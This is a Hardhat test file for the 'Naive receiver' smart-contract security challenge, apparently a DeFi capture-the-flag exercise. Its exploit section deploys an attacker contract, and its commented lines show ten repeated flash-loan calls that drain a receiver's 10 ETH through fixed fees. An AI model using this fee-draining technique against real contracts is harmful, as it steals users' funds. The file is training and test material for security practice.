const { ethers } = require('hardhat');
const { expect } = require('chai');

describe('[Challenge] Naive receiver', function () {
    let deployer, user, attacker;

    // Pool has 1000 ETH in balance
    const ETHER_IN_POOL = ethers.utils.parseEther('1000');

    // Receiver has 10 ETH in balance
    const ETHER_IN_RECEIVER = ethers.utils.parseEther('10');

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        [deployer, user, attacker] = await ethers.getSigners();

        const LenderPoolFactory = await ethers.getContractFactory('NaiveReceiverLenderPool', deployer);
        const FlashLoanReceiverFactory = await ethers.getContractFactory('FlashLoanReceiver', deployer);

        this.pool = await LenderPoolFactory.deploy();

       
        await deployer.sendTransaction({ to: this.pool.address, value: ETHER_IN_POOL });
        
        expect(await ethers.provider.getBalance(this.pool.address)).to.be.equal(ETHER_IN_POOL);
        expect(await this.pool.fixedFee()).to.be.equal(ethers.utils.parseEther('1'));

        this.receiver = await FlashLoanReceiverFactory.deploy(this.pool.address);
        await deployer.sendTransaction({ to: this.receiver.address, value: ETHER_IN_RECEIVER });
        
        expect(await ethers.provider.getBalance(this.receiver.address)).to.be.equal(ETHER_IN_RECEIVER);
    });

    it('Exploit', async function () {
        /** CODE YOUR EXPLOIT HERE */   
        const AttackerFactory = await ethers.getContractFactory('Attacker', deployer);

        this.attackerCntr = await AttackerFactory.deploy(this.pool.address);
        
        console.log("CODE YOUR EXPLOIT HERE", ETHER_IN_RECEIVER)
        // const attackerContract = await (await ethers.getContractFactory('NaiveReceiverAttacker', attacker)).deploy(this.pool.address);
        // await attackerContract.connect(attacker).attack(this.receiver.address, 10);
        // console.log("contract", this.attacker)
        // this.token.connect(attacker).transfer(this.pool.address, 50);
        await this.attackerCntr.attack(this.receiver.address)
        // this.pool.flashLoan(this.receiver.address, 1)
        // this.pool.flashLoan(this.receiver.address, 1)
        // this.pool.flashLoan(this.receiver.address, 1)
        // this.pool.flashLoan(this.receiver.address, 1)
        // this.pool.flashLoan(this.receiver.address, 1)
        
        // this.pool.flashLoan(this.receiver.address, 1)
        // this.pool.flashLoan(this.receiver.address, 1)
        // this.pool.flashLoan(this.receiver.address, 1)
        // this.pool.flashLoan(this.receiver.address, 1)
        // this.pool.flashLoan(this.receiver.address, 1)
        // await this.token.connect(this.receiver.address).transfer(this.pool.address, 50);
        // await this.token.connect(user).transfer(this.pool.address, 50);
        // await this.token.connect(deployer).transfer(this.pool.address, 50);
    });

    after(async function () {
        /** SUCCESS CONDITIONS */

        // All ETH has been drained from the receiver
        //0x8ac7230489e80000
        // const asd =await ethers.provider.getBalance(this.receiver.address);
        // console.log('asd', asd)
        expect(
            await ethers.provider.getBalance(this.receiver.address)
        ).to.be.equal('0');
        // console.log('pool', await ethers.provider.getBalance(this.pool.address))
        expect(
            await ethers.provider.getBalance(this.pool.address)
        ).to.be.equal(ETHER_IN_POOL.add(ETHER_IN_RECEIVER));
    });
});
